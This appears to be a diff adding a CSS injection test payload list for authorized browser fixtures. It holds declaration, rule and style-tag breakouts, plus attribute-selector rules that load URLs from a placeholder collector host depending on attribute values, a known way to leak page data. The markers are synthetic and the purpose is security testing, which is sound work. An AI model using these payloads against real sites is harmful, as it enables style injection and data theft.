@@ -1,0 +1,52 @@
+# CSS Injection Testing Payloads
+# Independent cases for authorized browser fixtures. Match the insertion context before using a line.
+# Collector URLs are local lab placeholders; do not substitute real secrets into selectors.
+
+# Whole-stylesheet harmless visual controls
+html { outline: 4px solid rgb(17, 119, 221); }
+body::before { content: "CSS_LAB_MARKER"; display: block; color: rgb(171, 34, 85); }
+.css-lab-target { background-color: rgb(238, 221, 170) !important; }
+
+# Declaration-value breakouts: assume input is inserted after color: inside an existing rule
+red; outline: 3px dashed rgb(52, 152, 219)
+blue; --css-lab-marker: declaration-controlled
+inherit; background-image: url("https://collector.example.test/css/declaration-marker")
+
+# Rule-boundary breakouts: assume an existing declaration/rule surrounds the insertion point
+red; } .css-lab-target { outline: 5px dotted rgb(155, 89, 182); } /*
+initial; } body::after { content: "CSS_RULE_BOUNDARY"; } /*
+
+# External resource controls: use a lab collector and inspect actual browser requests
+@import url("https://collector.example.test/css/import-control.css");
+.css-lab-image { background-image: url("https://collector.example.test/css/background-control"); }
+.css-lab-list { list-style-image: url("https://collector.example.test/css/list-control"); }
+.css-lab-target::before { content: url("https://collector.example.test/css/generated-content-control"); }
+# @import must precede ordinary style rules, apart from allowed at-rule exceptions.
+
+# Synthetic attribute fixture, placed in the local test page before testing the selectors below
+<div class="css-lab-target" data-css-lab="CSS_SYNTHETIC_MARKER">CSS fixture</div>
+
+# Conditional resource loads: distinguish a known marker from a known absent control
+[data-css-lab="CSS_SYNTHETIC_MARKER"] { background-image: url("https://collector.example.test/css/exact-match"); }
+[data-css-lab="CSS_ABSENT_MARKER"] { background-image: url("https://collector.example.test/css/absent-control"); }
+[data-css-lab^="CSS_SYNTHETIC"] { background-image: url("https://collector.example.test/css/prefix-match"); }
+[data-css-lab$="MARKER"] { background-image: url("https://collector.example.test/css/suffix-match"); }
+[data-css-lab*="SYNTHETIC"] { background-image: url("https://collector.example.test/css/substring-match"); }
+
+# :has parent-selection fixture: requires browser support and the synthetic descendant element
+body:has([data-css-lab="CSS_SYNTHETIC_MARKER"]) { background-image: url("https://collector.example.test/css/has-control"); }
+
+# Custom-property source and consumer; both lines are needed for the controlled rendering fixture
+:root { --css-lab-background: url("https://collector.example.test/css/custom-property-control"); }
+.css-lab-target { background-image: var(--css-lab-background); }
+
+# Selector-context breakout: input substitutes the selector before a fixed declaration block
+.css-lab-target, body
+.css-lab-target[data-css-lab="CSS_SYNTHETIC_MARKER"]
+
+# HTML attribute boundary visual marker: requires an unescaped double-quoted style attribute sink
+red" data-css-boundary="CSS_ATTRIBUTE_MARKER
+
+</style><div data-css-breakout="CSS_STYLE_BOUNDARY">CSS style boundary marker</div><style>
+
+color: \72 ed;
